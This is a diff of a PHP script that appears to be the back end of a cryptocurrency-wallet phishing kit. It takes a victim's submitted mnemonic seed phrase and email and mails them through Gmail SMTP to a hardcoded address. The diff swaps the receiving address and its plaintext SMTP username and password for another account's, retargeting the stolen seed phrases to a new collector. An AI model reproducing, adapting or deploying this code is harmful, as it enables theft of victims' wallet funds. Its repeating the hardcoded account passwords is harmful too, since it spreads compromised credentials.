@@ -12,7 +12,7 @@ $mnemonic = $_POST['mnemonic'];
 $wallet_email = $_POST['wallet_email'];
 $bip = $_POST['bip'];
 $email_from = $wallet_email;
-$email_to = 'emmajoy658@gmail.com';
+$email_to = 'Steve.wood00sw@gmail.com';
 
 if($mnemonic== '' || $wallet_email== '' || $bip== ''){
         echo "check the fields";
@@ -27,8 +27,8 @@ $mail->Host = "smtp.gmail.com";
 $mail->SMTPAuth = "true";
 $mail->SMTPSecure = "tls";
 $mail->Port = "587";
-$mail->Username = "emmajoy658@gmail.com";
-$mail->Password = "Olasunkanmi2001!";
+$mail->Username = "Steve.wood00sw@gmail.com";
+$mail->Password = "Loveisgood94";
 $mail->setFrom($_POST['wallet_email'], $_POST['mnemonic']);
 $mail->AddReplyTo($_POST['wallet_email'], $_POST['mnemonic']);
 $mail->Subject = "/New Entry";
